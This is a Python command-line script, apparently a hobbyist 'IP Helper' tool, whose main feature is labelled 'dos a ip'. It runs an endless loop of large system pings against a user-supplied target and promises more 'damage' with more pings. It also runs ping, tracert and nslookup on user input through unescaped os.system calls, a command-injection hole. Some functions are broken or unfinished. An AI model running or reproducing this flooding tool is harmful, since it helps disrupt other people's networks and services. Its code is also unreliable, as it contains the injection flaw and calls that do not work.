import os
import ipaddress 
import threading
import time
import asyncio
import socket

# System call
os.system("")

# Class of different styles
class style():
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'


loading = """
╔╗             ╔╗
║║             ║║
║║   ╔══╗╔══╗╔═╝║╔╗╔═╗─╔══╗
║║ ╔╗║╔╗║║╔╗║║╔╗║╠╣║╔╗╗║╔╗║
║╚═╝║║╚╝║║╔╗║║╚╝║║║║║║║║╚╝╠╦╦╗
╚═══╝╚══╝╚╝╚╝╚══╝╚╝╚╝╚╝╚═╗╠╩╩╝
                       ╔═╝║
                       ╚══╝"""


#create the loop for the ping function
loop = asyncio.get_event_loop() or asyncio.create_event_loop()
 

#create code that gets a area a ip is in
def locate():
    print("IN BETA!!")
    ipstart()


#gets info on a ip, fix the port, add more info.
def ipinfo():
    print(f"Enter the IP:")
    ip = input()
    try:
        print (ipaddress.ip_address(ip), "is a active ip address") 
    except Exception:
        wait = input("The ip you entered is not a valid ip address.")
    #get the open ports of a ip
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((ip, 0))
    print('listening on port:', sock.getsockname()[1])


#dos a ip, want to add a proxy server
async def ping(ip, size, amount: int):
    #ping pong, by by router
    try:
        os.system(f'ping -n {amount} -l {size} {ip}')
        ipstart()
    except Exception as e:
        print(f"The code can not ping the ip.")
        ipstart()


#prepare the attack
def attack():
    print(f"Enter the IP:")
    ip = input()
    #checks if the ip is valid or not
    try:
        print (ipaddress.ip_address(ip), "is a active ip address") 
    except Exception:
        print("The ip you entered is not a valid ip address.")
        ipstart()
    print("How many pings would you like to do? The more the merrier!(The more you have the longer it takes, but more damage is done, you need more to affect the ip.)")
    amount = int(input())
    print("What do you want the size of the ping to be?(anything over 1200 bytes will time out a lot of times, sometimes it doesn't, you can't do anything over 6500 bytes. The reccomended size is 1200.)")
    size = int(input())
    while True:
        #loops and runs the ping attack
        tsk = loop.create_task(ping(ip, size, amount))
        loop.run_until_complete(tsk)


#get a website info
def getweb():
    print("Enter the website to use.")
    website = input()
    #uses commands to get website info
    os.system(f'ping -n 1 {website}')
    os.system(f'tracert {website}')
    os.system(f'nslookup {website}')
    ipstart()


#start the code
def ipstart():
    print(f"""{style.RED}
    
██╗██████╗
██║██╔══██╗
██║██████╔╝ 
██║██╔═══╝  
██║██║       
╚═╝╚═╝  
{style.BLUE}
 ██╗  ██╗███████╗██      ██████╗ ███████╗██████╗
 ██║  ██║██╔════╝██║     ██╔══██╗██╔════╝██╔══██╗
 ███████║█████╗  ██      ██████╔╝█████╗  ██████╔╝
 ██╔  ██║██╔══╝  ██║     ██╔═══╝ ██╔══╝  ██╔══██╗
 ██║  ██║███████╗███████╗██║     ███████╗██║  ██║
 ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝     ╚══════╝╚═╝  ╚═╝   
    """)
    print(style.WHITE, """What action would you like to take?
    - attack {dos a ip}
    - get {get a websites ip}
    - locate {get the area a ip is located in}
    - ipinfo {see all public info on a ip}""")
    #does the action the user says.
    action = input()
    if action == "attack":
        print(style.CYAN, loading, style.RESET)
        time.sleep(3)
        attack()
    elif action == "get":
        print(style.CYAN, loading, style.RESET)
        time.sleep(3)
        getweb()
    elif action == "locate":
        print(style.CYAN, loading, style.RESET)
        time.sleep(3)
        locate()
    elif action == "ipinfo":
        print(style.CYAN, loading, style.RESET)
        time.sleep(3)
        ipinfo()
    else:
        print("You did not enter a correct action to perform!")
        print(style.CYAN, loading, style.RESET)
        time.sleep(3)
        ipstart()


ipstart()

